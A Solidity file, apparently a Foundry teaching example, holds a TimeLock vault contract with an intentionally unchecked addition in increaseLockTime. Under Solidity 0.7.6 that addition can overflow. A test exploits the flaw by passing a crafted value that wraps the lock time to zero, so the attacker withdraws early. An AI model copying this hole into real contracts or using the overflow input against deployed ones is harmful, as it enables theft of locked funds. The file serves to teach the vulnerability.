// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
//pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Alice and bob both have 1 Ether balance
2. Deploy TimeLock Contract
3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether
4. Bob caused an overflow on his lockTime
5, Alice can't withdraw 1 Ether, because the lock time not expired.
6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0
What happened?
Attack caused the TimeLock.lockTime to overflow,
and was able to withdraw before the 1 week waiting period.
*/
contract TimeLock {
  mapping(address => uint256) public deposits;
  mapping(address => uint256) public lockTime;

  function deposit() external payable {
    deposits[msg.sender] += msg.value;
    lockTime[msg.sender] = block.timestamp + 1 weeks;
  }

  function increaseLockTime(uint256 increaseTime) external {
    lockTime[msg.sender] += increaseTime;//vulnerable
  }

  function withdraw() external {
    require(deposits[msg.sender] > 0, "zero balance");
    require(block.timestamp > lockTime[msg.sender], "lock time not expired");
    uint256 balance = deposits[msg.sender];
    delete deposits[msg.sender];
    delete lockTime[msg.sender];
    (bool success,) = msg.sender.call{value : balance}("");
    require(success, "withdraw failed");
  }
}

contract Contract_Test is Test {
  TimeLock private timelock;

  function setUp() public {
    timelock = new TimeLock();
  }

  function testOverflow() public {
    address alice = vm.addr(1);
    address bob = vm.addr(2);
    deal(alice, 1 ether);
    deal(bob, 1 ether);

    vm.prank(alice);
    timelock.deposit{value: 1 ether}();

    vm.startPrank(bob);
    timelock.deposit{value: 1 ether}();
    timelock.increaseLockTime(type(uint256).max - timelock.lockTime(bob) + 1);
    console.log("bob lockTime:", timelock.lockTime(bob));
    vm.stopPrank();

    vm.prank(alice);
    vm.expectRevert("lock time not expired");
    timelock.withdraw();

    vm.prank(bob);
    timelock.withdraw();
    assertEq(bob.balance, 1 ether);
    assertEq(timelock.deposits(bob), 0);
    assertEq(timelock.lockTime(bob), 0);
  }
}